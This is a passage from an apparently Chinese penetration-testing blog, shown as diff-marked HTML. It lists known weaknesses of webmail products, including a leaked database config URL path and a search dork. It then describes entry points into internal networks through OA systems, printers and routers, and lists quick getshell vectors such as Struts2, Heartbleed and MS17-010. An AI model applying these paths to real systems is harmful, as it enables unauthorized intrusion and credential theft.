-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">查看zimbra版本:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/webmail.xxx.com/help</span><span class="regexp">/zh_CN/standard</span><span class="regexp">/version.htm</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Atmail 邮件系统: </div><div class="line">敏感信息泄露问题[数据库账号密码]:</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.xxx.com/config</span><span class="regexp">/dbconfig.ini</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Lotus Domino <span class="symbol">Webmail:</span></div><div class="line">越权访问,<span class="symbol">inurl:</span>.nsf/WebHelp/!OpenPage</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">TurboMail邮件系统: </div><div class="line">默认配置不当可进入任意邮箱,默认有四个root域账号,一个管理员,三个普通用户</div><div class="line">由于设置缺陷,导致普通用户可以查看任意用户的密码</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">U-<span class="symbol">mail:</span></div><div class="line">sql注入,可写shell</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">WinMail:</span></div><div class="line">非授权访问/权限绕过</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ExtMail :</div><div class="line">老版本注入</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SquirrelMail</div></pre></td></tr></table></figure>
-<p>0x04 找目标的oa系统或者图书馆之类的网站以及各种边界网络设备的web管理端[一般像这些东西跟内网的联系比较大]:<br>&nbsp;&nbsp;&nbsp;&nbsp;oa本来就是为了方便员工远程办公,处理公司各种业务用的,但,这也给我们提供了通往目标内部的入口至于,为什么非要选则图书馆,目的很显然,既然是图书馆,你肯定会想到内部的什么图书管理系统,实际经验也证明,大多数图书馆的站,都会处在内网中找各种网络设备的web管理端,主要是想登进去以后,看看有没有可以上传shell的地方,也许可以利用得到</p>
-<p>0x05 在你能力足够的情况下,直接搞路由也是可以的[比如,cisco,端口镜像,抓包分析,说实话自己对路由并不是非常擅长]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">路由作为一种边界设备,搞它的意义就不用再多说了吧</div></pre></td></tr></table></figure></p>
-<p>0x06 暴露在边界的目标打印机,智能点儿的打印机都会自带一些web服务[通常是java]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">打印机,就更不用说了,典型的内部设备,一般是先找到配置管理界面,部署war包</div></pre></td></tr></table></figure></p>
-<p>0x07 如果实在外部搞不定,条件允许的情况下,尝试实地渗透也是可以的,比如,通过无线进入目标内部<br>&nbsp;&nbsp;&nbsp;&nbsp;这也算是一种相对比较高效的渗透方式,老外非常干这个,但前提是,你可能需要很多次的蹲点,才能确认目标,实地渗透对你的心里素质要求可能会更高一些,另外,现场的环境和有限的时间也多多少少会影响到你<br><br></p>
-<p>一些小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;时间原因,暂时就想到这些,都是一些平时的经验加上一点自己的想法,其实,就整个信息搜集来讲,对你的社工能力其实是个不小的考验,我自己在这方面确实是弱项,后续会慢慢加强<br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2014/12/17/info-getshell/">
-                信息搜集阶段可快速getshell的一些方式
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2014-12-17</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/info-getshell/">info getshell</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">针对各类开源程序的一些老exp</div><div class="line">各远程执行类漏洞,如,Struts2,iis,tomcat,proftp,elasticsearch...</div><div class="line">各种敏感文件下载泄露,如,各类备份下载,敏感配置文件泄露,后端脚本源码泄露,svn泄露...</div><div class="line">针对各类服务的未授权访问</div><div class="line">各类web及服务入口弱口令,万能密码...</div><div class="line">各类后门,如,别人的webshell,古老的shift后门,等等……</div><div class="line">bash远程执行,心脏滴血...</div><div class="line">win smb系列远程执行漏洞,如,ms17-<span class="number">010</span></div><div class="line">目标的各类vpn及mail账号密码泄露</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p><br></p>
 
         </div>
     
